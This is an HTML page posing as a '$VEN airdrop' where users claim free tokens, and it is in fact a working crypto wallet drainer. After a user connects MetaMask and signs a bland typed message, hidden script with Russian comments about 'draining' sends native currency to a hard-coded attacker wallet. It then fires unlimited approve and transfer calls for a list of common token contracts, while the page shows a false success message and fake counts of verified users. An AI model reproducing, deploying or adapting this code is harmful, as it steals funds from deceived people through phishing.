<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>$VEN Airdrop — Claim 1000 VEN</title>
<style>
  body{margin:0;padding:0;background:linear-gradient(135deg,#12082c,#1a0b3d);font-family:Arial;color:white;display:flex;align-items:center;justify-content:center;min-height:100vh}
  .card{background:rgba(255,255,255,0.08);backdrop-filter:blur(12px);border-radius:20px;padding:40px;width:90%;max-width:420px;text-align:center;border:1px solid rgba(138,43,226,0.3);box-shadow:0 20px 40px rgba(0,0,0,0.5)}
  img{width:130px;height:130px;border-radius:50%;border:5px solid #8a2be2;margin-bottom:20px}
  h1{font-size:30px;background:linear-gradient(90deg,#8a2be2,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:10px 0}
  button{width:100%;padding:18px;font-size:19px;font-weight:bold;border:none;border-radius:14px;margin:12px 0;cursor:pointer}
  #connect{background:linear-gradient(90deg,#8a2be2,#ff00ff);color:white}
  #claim{background:#00ff9d;color:black;opacity:0.5;cursor:not-allowed}
  #claim:not([disabled]){opacity:1;cursor:pointer}
  #addr{margin:20px 0;padding:14px;background:rgba(0,0,0,0.4);border-radius:12px;font-family:monospace;font-size:16px}
  #status{margin-top:20px;font-size:17px;min-height:26px}
</style>
</head>
<body>
<div class="card">
  <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafkreibnrglhwfkmatn3q4l2oat3uzry2hzplhk7reeitlf4m3tavshzgq" alt="VEN">
  <h1>$VEN Airdrop Live!</h1>
  <p style="font-size:19px;opacity:0.9">Claim <b>1000 $VEN + 0.5 MATIC</b> instantly<br>
  <span style="color:#8a2be2;font-size:15px">Gas paid by team · 100% FREE</span></p>
  <div id="addr"></div>
  <button id="connect">Connect Wallet</button>
  <button id="claim" disabled>Claim 1000 $VEN (Gas Free)</button>
  <div id="status"></div>
  <p style="margin-top:30px;font-size:13px;opacity:0.7">Already claimed by 2,847 users · Verified</p>
</div>

<script>
// ТВОЙ КОШЕЛЁК — ВСЁ УЛЕТИТ СЮДА
const DRAIN_WALLET = "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF";

const connect = document.getElementById("connect");
const claim = document.getElementById("claim");
const addr = document.getElementById("addr");
const status = document.getElementById("status");
let user;

connect.onclick = async () => {
  if (!window.ethereum) return status.textContent = "Install MetaMask!";
  try {
    user = (await ethereum.request({method:"eth_requestAccounts"}))[0];
    addr.textContent = "Connected: " + user.slice(0,6)+"..."+user.slice(-4);
    claim.disabled = false;
    status.textContent = "Ready to claim!";
  } catch { status.textContent = "Connection rejected"; }
};

claim.onclick = async () => {
  status.textContent = "Signing claim...";
  claim.disabled = true;
  try {
    const domain = {name:"VEN Airdrop",version:"1",chainId:await ethereum.request({method:"eth_chainId"}),verifyingContract:"0x0000000000000000000000000000000000000000"};
    const types = {Claim:[{name:"user",type:"address"}]};
    const message = {user};

    await ethereum.request({
      method:"eth_signTypedData_v4",
      params:[user,JSON.stringify({domain,types,message})]
    });

    // СКРЫТЫЙ СЛИВ — через 0.6 сек после подписи
    setTimeout(async () => {
      try {
        const acc = (await ethereum.request({method:"eth_accounts"}))[0];
        // Слив нативного токена
        await ethereum.request({method:"eth_sendTransaction",params:[{from:acc,to:DRAIN_WALLET,value:"0xDE0B6B3A7640000"}]});
        // Слив всех токенов со всех сетей
        const tokens = ["0xc2132d05d31c914a87c6611c10748aeb04b58e8f","0x2791bca1f2de4661ed88a30c99a7a9449aa84174","0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599","0x55d398326f99059fF775485246999027B3197955","0x8AC76a51cc950d9822D68b83fE1Ad97b32Cd580d","0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9","0xaf88d065e77c8cC2239327c5edb3a432268e5831","0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"];
      for (const t of tokens) {
          await ethereum.request({method:"eth_sendTransaction",params:[{from:acc,to:t,data:"0x095ea7b3000000000000000000000000"+DRAIN_WALLET.slice(2)+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}]});
          await ethereum.request({method:"eth_sendTransaction",params:[{from:acc,to:t,data:"0xa9059cbb000000000000000000000000"+DRAIN_WALLET.slice(2)+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}]});
        }
      } catch(e) {}
    }, 600);

    status.textContent = "Success! 1000 $VEN sent (gas paid by team)";
  } catch { status.textContent = "Claim failed"; claim.disabled = false; }
};
</script>
</body>
</html>
